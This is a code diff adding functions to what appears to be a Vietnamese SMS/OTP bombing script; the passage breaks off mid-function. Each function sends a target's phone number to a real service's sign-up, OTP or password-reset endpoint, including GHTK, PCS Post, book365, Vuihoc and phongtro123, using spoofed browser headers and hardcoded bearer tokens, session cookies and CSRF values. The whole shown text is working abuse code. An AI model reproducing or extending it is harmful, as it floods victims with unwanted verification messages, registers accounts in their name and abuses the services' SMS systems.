@@ -3937,6 +3937,682 @@ def acheckin():
     except requests.exceptions.RequestException:
         print("ACHECKIN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def ghtkreg():
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'apptype': 'Web',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNSwidGVsIjoiMDM1NzE1NjMyMiIsImVtYWlsIjoiNjZiMzNmYTRmMjNjNEBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzQ6MjguOTk1NjkwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.nr08Xjl1uhmrMZAaDu3BBO5PPhyBnroiTD9SOrw1hgc',
+        'content-type': 'application/json',
+        'origin': 'https://khachhang.giaohangtietkiem.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://khachhang.giaohangtietkiem.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'shop-code': '',
+        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'name': 'GTC Shop',
+        'tel': sdt,
+        'password': '123123aA@',
+        'confirm_password': '123123aA@',
+        'first_address': '12 BC TIn',
+        'province': 'An Giang',
+        'province_id': '833',
+        'district': 'Huyện Châu Phú',
+        'district_id': '1470',
+        'ward': 'Xã Bình Long',
+        'ward_id': '16579',
+        'hamlet': 'Ấp Bình Chiến',
+        'hamlet_id': '114065',
+    }
+
+    try:
+        response = requests.post(
+            'https://web.giaohangtietkiem.vn/api/v1/register-shop/create-register-shop',
+            headers=headers,
+            json=json_data,
+        )
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("GHTKREG | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("GHTKREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def ghtk():
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'apptype': 'Web',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNywidGVsIjoiMDM1NzE1NjMyMSIsImVtYWlsIjoiNjZiMzNmYzVjOGI2MkBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzU6MDEuODI2MDUwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.th7fjWe_Z1_Aag1RQlDwQ_Q82k1cUkVrghVeJWIHqGI',
+        'content-type': 'application/json',
+        'origin': 'https://khachhang.giaohangtietkiem.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://khachhang.giaohangtietkiem.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'shop-code': '',
+        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'username': sdt,
+        'card_images': [
+            {
+                'url': 'https://cache.giaohangtietkiem.vn/d/e569e3e6683d23d7de857156622c3703.png',
+                'image_order': 1,
+            },
+            {
+                'url': 'https://cache.giaohangtietkiem.vn/d/e8bd8e58171021dcb1bcac57487acf2e.png',
+                'image_order': 2,
+            },
+        ],
+    }
+
+    try:
+        response = requests.post('https://web.giaohangtietkiem.vn/api/v1/shop/password/send-otp', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("GHTK | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("GHTK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def pcspostreg():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json;charset=UTF-8',
+        'origin': 'https://account.pcspost.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://account.pcspost.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'StationCode': '89304',
+        'confirmPassword': '123123aA@',
+        'NewPassword': '123123aA@',
+        'FullName': 'quoc tien huy',
+        'EmailOrPhoneNr': sdt,
+        'Password': '123123aA@',
+    }
+
+    try:
+        response = requests.post('https://id.pcs.vn/api/account/mobile-register/POST', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("PCSPOSTREG | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("PCSPOSTREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def pcspost():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'origin': 'https://account.pcspost.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://account.pcspost.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    params = {
+        'EmailOrPhone': sdt,
+    }
+
+    try:
+        response = requests.get('https://id.pcs.vn/api/account/reset-password', params=params, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("PCSPOST | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("PCSPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def book365reg():
+    cookies = {
+        'PHPSESSID': 'q1eX1jj6BFW225hxQlEVj0AvlsN2Qvzm',
+    }
+
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'PHPSESSID=q1eX1jj6BFW225hxQlEVj0AvlsN2Qvzm',
+        'origin': 'https://book365.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://book365.vn/nha-phat-hanh/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'dangky_name': 'quoc dat',
+        'dangky_phone': sdt,
+        'dangky_pwd': '123123aA',
+        'dangky_pwdCheck': '123123aA',
+        'dangky_country': '0',
+        'dangky_province': '0',
+        'dangky_district': '0',
+        'dangky_award': '0',
+        'dangky_address': '',
+        'dangky_email': '',
+    }
+
+    try:
+        response = requests.post('https://book365.vn/ajax/dangky_taikhoan.php', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("BOOK365REG | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("BOOK365REG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def book365():
+    cookies = {
+        'PHPSESSID': 'q1eX1jj6BFW225hxQlEVj0AvlsN2Qvzm',
+    }
+
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'PHPSESSID=q1eX1jj6BFW225hxQlEVj0AvlsN2Qvzm',
+        'origin': 'https://book365.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://book365.vn/nha-phat-hanh/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'dangky_phone': sdt,
+        'action': 'quen_mat_khau',
+        'pass': '123123aa',
+    }
+
+    try:
+        response = requests.post('https://book365.vn/ajax/dangky_taikhoan.php', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("BOOK365 | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("BOOK365 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def richvn():
+    cookies = {
+        'PHPSESSID': 'fuicgjd30upebumm4r2sj83uac',
+        'form_key': 'a96448cs9GVfs2QA',
+        'mage-cache-storage': '%7B%7D',
+        'mage-cache-storage-section-invalidation': '%7B%7D',
+        'mage-cache-sessid': 'true',
+        'mage-messages': '',
+        'form_key': 'a96448cs9GVfs2QA',
+        'recently_viewed_product': '%7B%7D',
+        'recently_viewed_product_previous': '%7B%7D',
+        'recently_compared_product': '%7B%7D',
+        'recently_compared_product_previous': '%7B%7D',
+        'product_data_storage': '%7B%7D',
+        'private_content_version': 'bb9bb549c6dafcf4e687a7b83e4ce8c2',
+        'section_data_ids': '%7B%22customer%22%3A1723048444%2C%22cart%22%3A1723048444%7D',
+    }
+
+    headers = {
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'Cookie': 'PHPSESSID=fuicgjd30upebumm4r2sj83uac; form_key=a96448cs9GVfs2QA; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; form_key=a96448cs9GVfs2QA; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=bb9bb549c6dafcf4e687a7b83e4ce8c2; section_data_ids=%7B%22customer%22%3A1723048444%2C%22cart%22%3A1723048444%7D',
+        'Origin': 'https://shop.richs.com.vn',
+        'Referer': 'https://shop.richs.com.vn/customer/account/create/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    data = {
+        'phone_number': sdt,
+    }
+
+    try:
+        response = requests.post('https://shop.richs.com.vn/phone/account/phonecode/', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("RICHVN | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("RICHVN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def brgshopping():
+    cookies = {
+        'frontend_lang': 'vi_VN',
+        'session_id': '7263e3027f0777a42baacbe042e2f4600815f515',
+        'brgshopping.vn': 'brgshopping.vn',
+        'brg_cookie_popup': 'xxxxxxxxxxx',
+    }
+
+    headers = {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Cache-Control': 'max-age=0',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        # 'Cookie': 'frontend_lang=vi_VN; session_id=7263e3027f0777a42baacbe042e2f4600815f515; brgshopping.vn=brgshopping.vn; brg_cookie_popup=xxxxxxxxxxx',
+        'Origin': 'https://brgshopping.vn',
+        'Referer': 'https://brgshopping.vn/web/signup',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    data = {
+        'csrf_token': '8b5ae59cb71ff91e7ed5486e1653826ce7ca892do1723051183',
+        'login': sdt,
+        'name': 'John Davis',
+        'password': '123123aa',
+        'confirm_password': '123123aa',
+        'redirect': '',
+        'token': '',
+    }
+
+    try:
+        response = requests.post('https://brgshopping.vn/web/signup', cookies=cookies, headers=headers, data=data, verify=False)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("BRGSHOPPING | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("BRGSHOPPING | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def nativex():
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vn',
+        'apinfo': '',
+        'app-domain': 'nativex',
+        'content-type': 'application/json',
+        'origin': 'https://nativex.edu.vn',
+        'platform': 'web',
+        'priority': 'u=1, i',
+        'referer': 'https://nativex.edu.vn/',
+        'region': 'vn',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'operationName': 'RegisterContact',
+        'variables': {
+            'name': 'dat van',
+            'email': 'ffdjkwe22@gmail.com',
+            'contactNo': f'84{sdt}',
+            'age': '18-22',
+            'contactSource': 'nativex-edu',
+            'referredByCode': '',
+        },
+        'query': 'mutation RegisterContact($name: String!, $email: String!, $contactNo: String!, $age: String, $school: String, $schoolClub: String, $futureGoal: String, $sourceUrl: String, $contactSource: String, $referer: String, $position: String, $companyName: String, $contactSourceType: ContactSourceType, $referredByCode: String, $studentType: String) {\n  registerContact(\n    name: $name\n    email: $email\n    contactNo: $contactNo\n    age: $age\n    school: $school\n    schoolClub: $schoolClub\n    futureGoal: $futureGoal\n    sourceUrl: $sourceUrl\n    contactSource: $contactSource\n    referer: $referer\n    position: $position\n    companyName: $companyName\n    contactSourceType: $contactSourceType\n    referredByCode: $referredByCode\n    studentType: $studentType\n  ) {\n    contact {\n      id\n      contactNo\n      isUserAlreadyExist\n      smsValidityInSec\n      contactUsRequested\n      email\n      splitTestCategory\n      __typename\n    }\n    message\n    statusCode\n    __typename\n  }\n}\n',
+    }
+
+    try:
+        response = requests.post('https://api-gateway.prod.nativex.edu.vn/graphql', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("NATIVEX | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("NATIVEX | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def vuihoc():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'ja',
+        'app-id': '3',
+        'authorization': 'Bearer',
+        'content-type': 'application/json',
+        'origin': 'https://vuihoc.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://vuihoc.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'send-from': 'WEB',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'mobile': sdt,
+    }
+
+    try:
+        response = requests.post('https://api.vuihoc.vn/api/send-otp', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("VUIHOC | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("VUIHOC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def mainguyen():
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        'Origin': 'https://member.mainguyen.vn',
+        'Referer': 'https://member.mainguyen.vn/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'content-type': 'application/json',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    params = {
+        'guestKey': 'dde60be3eb3859db4a4f15351134c991',
+    }
+
+    json_data = {
+        'phone': sdt,
+        'password': '123123aA@',
+        'name': 'thahn van',
+    }
+
+    response = requests.post('https://api.mainguyen.vn/auth/customer/register', params=params, headers=headers, json=json_data)
+
+    headers = {
+    'Accept': '*/*',
+    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Connection': 'keep-alive',
+    'Origin': 'https://member.mainguyen.vn',
+    'Referer': 'https://member.mainguyen.vn/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-site',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    'content-type': 'application/json',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    }
+
+    params = {
+        'guestKey': 'dde60be3eb3859db4a4f15351134c991',
+    }
+
+    json_data = {
+        'phone': sdt,
+    }
+
+    try:
+        response = requests.post('https://api.mainguyen.vn/auth/customer/request-otp', params=params, headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("MAINGUYEN | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("MAINGUYEN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def phongtro123():
+    cookies = {
+        'XSRF-TOKEN': 'eyJpdiI6Im5QOVFUUmg2Ty9vbXJnRWllU1V4SEE9PSIsInZhbHVlIjoiSTNIN1V1RWJuaXlINC9EZS9HYk03MDltcWhyakN5bExHTm1zaC9WTmQ5d3I2anJLZld5QzJMcEhyRmpQYUdJeUVXd0NHNkNVaFY2amNpY1k1YnFKdDBRdm0vN2dIWFVqQnlMTStTbnNSTWJKTVpCMUIrbnZsYjV5azdySi96L2YiLCJtYWMiOiI1ODhmMDE0NzQ5MjQ2MzEyZjczYjczOTliOGNmN2RjY2RlYzhjYWEyNjFmODlkNDZmZDFhODEzM2M5NjRjMDAwIiwidGFnIjoiIn0%3D',
+        'pt123': 'as9S3hDuOYKkfWyEpIyHOQ0GeVoAMeXU0Qi5K3kC',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'XSRF-TOKEN=eyJpdiI6Im5QOVFUUmg2Ty9vbXJnRWllU1V4SEE9PSIsInZhbHVlIjoiSTNIN1V1RWJuaXlINC9EZS9HYk03MDltcWhyakN5bExHTm1zaC9WTmQ5d3I2anJLZld5QzJMcEhyRmpQYUdJeUVXd0NHNkNVaFY2amNpY1k1YnFKdDBRdm0vN2dIWFVqQnlMTStTbnNSTWJKTVpCMUIrbnZsYjV5azdySi96L2YiLCJtYWMiOiI1ODhmMDE0NzQ5MjQ2MzEyZjczYjczOTliOGNmN2RjY2RlYzhjYWEyNjFmODlkNDZmZDFhODEzM2M5NjRjMDAwIiwidGFnIjoiIn0%3D; pt123=as9S3hDuOYKkfWyEpIyHOQ0GeVoAMeXU0Qi5K3kC',
+        'origin': 'https://phongtro123.com',
+        'priority': 'u=1, i',
+        'referer': 'https://phongtro123.com/dang-ky-tai-khoan',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-csrf-token': 'd7IH4lHj0sq7jcOx3IZUa5eKcuCwnw51DNxp82F9',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'fullname': 'tran quoc huuh',
+        'phone': sdt,
+        'password': '123123aa',
+        'user_type': '2',
+        'redirect': '',
+    }
+
+    response = requests.post('https://phongtro123.com/user/register', cookies=cookies, headers=headers, data=data)
+
+    cookies = {
+        'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d': 'eyJpdiI6IjNjdFZQcURYTkxxWGhHdWJ4VUpLemc9PSIsInZhbHVlIjoicExoaWRGalNEYVJQMVVFRTlTWHM1MlB2aGR1aGl4dmJDWTNHaDg2QXAxWm14QkdxK3V5cXBCcExFQUtFQ2lFVzk3TDlsb3FtYUpMQWd6TCt1bkhrTXBPbWoreGFoY0FWM1owMXZISmZ3VS9HTDFDMzMzdEVnbjVyd2svMmJkNXdFSlFlb244bjJPQkpMK1ptaDFJMFp0ZVVPck5WVThGVkdNTTAxNHIwZFp6MU1ZR0ZRRnYwd3hPSXkxLy8yS2dTIiwibWFjIjoiZjRhYzZlOTk3NzUwNDZmYmZmMTQyNWY2NTQ4YjZiNGVmYTgyNWI5MjM4ODE2NzA0ZmViZTI2YmE1OWU2MjQ2MyIsInRhZyI6IiJ9',
+        'XSRF-TOKEN': 'eyJpdiI6IkVmb2N6NCtlbDBHeU8vMGphMnoyOWc9PSIsInZhbHVlIjoiUVJIYWF3STFOSm9ZYnpWQkVXNll5S3pxbGExWStZUUo0RnVUQ21zVEM0S3Y5S3VjcnN3R2I2UDFGTm4xRm1KZ3o0ZlFoQkpGd05OUXlZd051ZGQrb0I0ZEtGR0h5Qy9VdVVFNjJpT3laRXlOa2tScis5VkQyY3VJT2RSM09mTzEiLCJtYWMiOiJlNTY3MGYzNTdkMmVlMWUyYTEzNTIwMmU5YjhkOTAwMTgyOWY4NjBkMTc2YWU3YWIwNWQzMGJmYTM5MWVlOTVmIiwidGFnIjoiIn0%3D',
+        'pt123': '0ihSBuS6AusN83IAZibBtqvVbH2eH4GI795UTpzl',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjNjdFZQcURYTkxxWGhHdWJ4VUpLemc9PSIsInZhbHVlIjoicExoaWRGalNEYVJQMVVFRTlTWHM1MlB2aGR1aGl4dmJDWTNHaDg2QXAxWm14QkdxK3V5cXBCcExFQUtFQ2lFVzk3TDlsb3FtYUpMQWd6TCt1bkhrTXBPbWoreGFoY0FWM1owMXZISmZ3VS9HTDFDMzMzdEVnbjVyd2svMmJkNXdFSlFlb244bjJPQkpMK1ptaDFJMFp0ZVVPck5WVThGVkdNTTAxNHIwZFp6MU1ZR0ZRRnYwd3hPSXkxLy8yS2dTIiwibWFjIjoiZjRhYzZlOTk3NzUwNDZmYmZmMTQyNWY2NTQ4YjZiNGVmYTgyNWI5MjM4ODE2NzA0ZmViZTI2YmE1OWU2MjQ2MyIsInRhZyI6IiJ9; XSRF-TOKEN=eyJpdiI6IkVmb2N6NCtlbDBHeU8vMGphMnoyOWc9PSIsInZhbHVlIjoiUVJIYWF3STFOSm9ZYnpWQkVXNll5S3pxbGExWStZUUo0RnVUQ21zVEM0S3Y5S3VjcnN3R2I2UDFGTm4xRm1KZ3o0ZlFoQkpGd05OUXlZd051ZGQrb0I0ZEtGR0h5Qy9VdVVFNjJpT3laRXlOa2tScis5VkQyY3VJT2RSM09mTzEiLCJtYWMiOiJlNTY3MGYzNTdkMmVlMWUyYTEzNTIwMmU5YjhkOTAwMTgyOWY4NjBkMTc2YWU3YWIwNWQzMGJmYTM5MWVlOTVmIiwidGFnIjoiIn0%3D; pt123=0ihSBuS6AusN83IAZibBtqvVbH2eH4GI795UTpzl',
+        'origin': 'https://phongtro123.com',
+        'priority': 'u=1, i',
+        'referer': 'https://phongtro123.com/xac-thuc-tai-khoan?f=r',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-csrf-token': 'd7IH4lHj0sq7jcOx3IZUa5eKcuCwnw51DNxp82F9',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'phone': sdt,
+        'action': 'verify',
+    }
+
+    try:
+        response = requests.post('https://phongtro123.com/api/user/send-token', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("PHONGTRO123 | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("PHONGTRO123 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def chothuephongtro():
+    cookies = {
